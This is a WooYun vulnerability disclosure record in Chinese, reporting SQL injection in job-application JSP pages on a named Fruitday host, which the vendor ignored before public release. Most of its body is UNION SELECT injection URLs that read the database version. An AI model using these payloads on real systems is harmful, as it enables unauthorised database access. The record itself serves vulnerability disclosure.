wybug_title: 天天果园某系统注入打包
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-04：	细节已通知厂商并且等待厂商处理中									2015-12-09：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入 详细说明：  http://hq.fruitday.com:88/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,3,@@version,5,6,7

存在漏洞页面如下/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7/pweb/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6/pweb/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,@@version,5,6/web/careerapply/HrmCareerApplyPerEdit.jsp?id=1 union select 1,2,3,@@version,5,6,7/web/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,3,@@version,5,6,7/web/careerapply/HrmCareerApplyWorkEdit.jsp?id=1 union select 1,2,3,@@version,5,6/web/careerapply/HrmCareerApplyWorkView.jsp?id=1 union select 1,2,3,4,5,@@version   漏洞证明：  

   修复方案：  补丁   版权声明：转载请注明来源 whynot@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-09 17:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
